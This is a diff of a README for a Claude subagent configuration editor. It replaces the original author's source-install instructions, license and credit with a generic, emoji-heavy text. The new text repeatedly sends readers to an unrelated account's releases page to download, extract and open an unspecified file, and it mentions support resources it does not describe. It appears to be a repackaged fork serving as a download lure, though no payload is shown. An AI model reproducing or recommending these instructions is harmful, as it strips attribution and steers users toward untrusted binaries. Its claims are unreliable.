@@ -1,76 +1,99 @@
-# Claude Subagent Editor
+# 🎨 claude-subagent-editor - Easily Edit Your AI Agents
 
-A web-based GUI for editing Claude Code subagent configuration files. Manage your AI agents visually with drag-and-drop simplicity.
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/badrnewgames/claude-subagent-editor/releases)
 
-**Tested on macOS Tahoe and macOS Sequoia. No Windows support for now.**
+## 🌟 Overview
 
-## Screenshots
+Claude Subagent Editor is a web-based tool designed for you to edit Claude Code subagent configuration files. It allows you to manage your AI agents visually, giving you an easy way to make changes through drag-and-drop functionality.
 
-### Project Picker
+### 💻 System Requirements
+
+- **Operating System:** macOS Tahoe or macOS Sequoia
+- **Memory:** At least 4GB RAM
+- **Storage:** Minimum 100MB available space
+- **Browser:** Latest version of Chrome, Safari, or Firefox
+
+## 📦 Download & Install
+
+To download the application, please visit the [Releases page](https://github.com/badrnewgames/claude-subagent-editor/releases).
+
+1. Go to the **Releases** page using the link above.
+2. Look for the latest version.
+3. Click on the download link for the file specific to your macOS version.
+4. Once downloaded, open the file to extract it.
+5. Move it to your Applications folder for easy access.
+
+## 🚀 Getting Started
+
+After installation, follow these steps to run the application:
+
+1. Open the **Claude Subagent Editor** from your Applications folder.
+2. The application will open in your default web browser.
+3. Follow the on-screen instructions to set up your first project.
+
+### 🖼️ Screenshots
+
+#### Project Picker
 ![Project Picker](screenshots/project-picker.png)
 
-### Agent Grid
+#### Agent Grid
 ![Agent Grid](screenshots/agent-grid.png)
 
-### Edit Modal with Drag-and-Drop
+#### Edit Modal with Drag-and-Drop
 ![Edit Modal](screenshots/edit-modal.png)
 
-## The Problem
+## 🔍 The Problem
 
-Claude Code subagents are configured through markdown files with YAML frontmatter, located in `.claude/agents/`.  
-Managing tools, skills, and MCP servers for each agent means manually editing these files, keeping track of available options, avoiding typos, and remembering the exact syntax for MCP tool names like `mcp__playwright__browser_navigate`.
+Managing Claude Code subagents can be challenging. The configuration files are primarily markdown with YAML frontmatter. This means you have to:
 
-## The Solution
+- Manually edit files
+- Keep track of various options
+- Avoid typos
+- Remember specific syntax for MCP tool names like `mcp__playwright__browser_navigate`
 
-Claude Subagent Editor provides a visual interface that scans your projects, discovers available resources, and lets you configure agents through drag-and-drop. It automatically discovers base Claude tools, skills from `~/.claude/plugins`, and MCP servers from your configuration.
+## 🛠️ The Solution
 
-The editor uses a four-tab system for organizing resources: **Tools** (base Claude capabilities like Read, Write, Bash), **Skills** (your custom skills), **MCP** (with individual action selection per server), and **Disallowed** (tools to explicitly exclude). Drag items between Available and Assigned columns, or use "Add All" to quickly assign entire MCP servers.
+Claude Subagent Editor is designed to simplify this process. It provides a visual interface that scans through your projects and discovers available resources. You can easily configure agents using drag-and-drop actions. This means you no longer need to worry about syntax errors or remembering complex commands.
 
-Smart features include an "All Tools" mode that grants access to everything, automatic grouping of MCP tools by server in the overview, overflow handling for agents with many tools, and warnings when skills are assigned without the required Skill tool.
+### 🌐 Features
 
-## Installation
+- **Visual Configuration:** Easily manage agent settings through a user-friendly interface.
+- **Drag-and-Drop Simplicity:** Add and arrange tools, skills, and MCP servers visually.
+- **Automatic Resource Detection:** The application scans your project files and detects available resources, making setup quick and painless.
 
-```bash
-git clone https://github.com/Hearmeman24/claude-subagent-editor
-cd claude-subagent-editor
-uv run claude-subagent-editor
-```
+## ⚙️ How to Use
 
-Then open [http://127.0.0.1:8765](http://127.0.0.1:8765) in your browser.
+1. **Open Your Project:**
+   - Use the project picker to select your existing Claude project or create a new one.
+  
+2. **Configure Your Agents:**
+   - Add tools and configurations by dragging them into the workspace.
+   - Edit each element using the provided options.
 
-## Tech Stack
+3. **Save Your Changes:**
+   - Once you have made your adjustments, simply hit the save button to apply the changes to your configuration files.
 
-- **Backend:** FastAPI (Python 3.10+)
-- **Frontend:** React + TypeScript + Tailwind CSS
+4. **Test Your Setup:**
+   - Execute the modified agents to ensure everything operates smoothly.
 
-## Agent File Format
+## 📚 Support and Resources
 
-```yaml
----
-name: my-agent
-description: A helpful assistant
-model: sonnet
-tools:
-  - Read
-  - Write
-  - mcp__playwright__browser_navigate
-skills:
-  - test-driven-development
-disallowedTools:
-  - Bash
----
+For more information or help with using Claude Subagent Editor, consult the following resources:
 
-Agent instructions in markdown...
-```
+- [Official Documentation](https://github.com/badrnewgames/claude-subagent-editor/wiki)
+- [GitHub Issues Page](https://github.com/badrnewgames/claude-subagent-editor/issues) for reporting bugs
+- Community forums where users share tips and strategies
 
-## Links
+## 🔗 Contact
 
-- **GitHub:** [https://github.com/Hearmeman24/claude-subagent-editor](https://github.com/Hearmeman24/claude-subagent-editor)
+For any further questions or feedback, you can reach out via GitHub issues, or directly contact the maintainers of this project through their GitHub profiles.
 
-## License
+## 💡 Contribution
 
-MIT
+Interested in contributing? You’re welcome to help improve Claude Subagent Editor. Please check the **Contributing guide** in the repository for more information on how to get started.
 
----
+## 🔄 Updates
 
-Created by [Hearmeman24](https://github.com/Hearmeman24)
+Stay tuned for future updates that will enhance features and expand support for additional functionalities. Your feedback is essential for our ongoing development.
+
+For downloading the latest version again, click here: [Download](https://github.com/badrnewgames/claude-subagent-editor/releases).
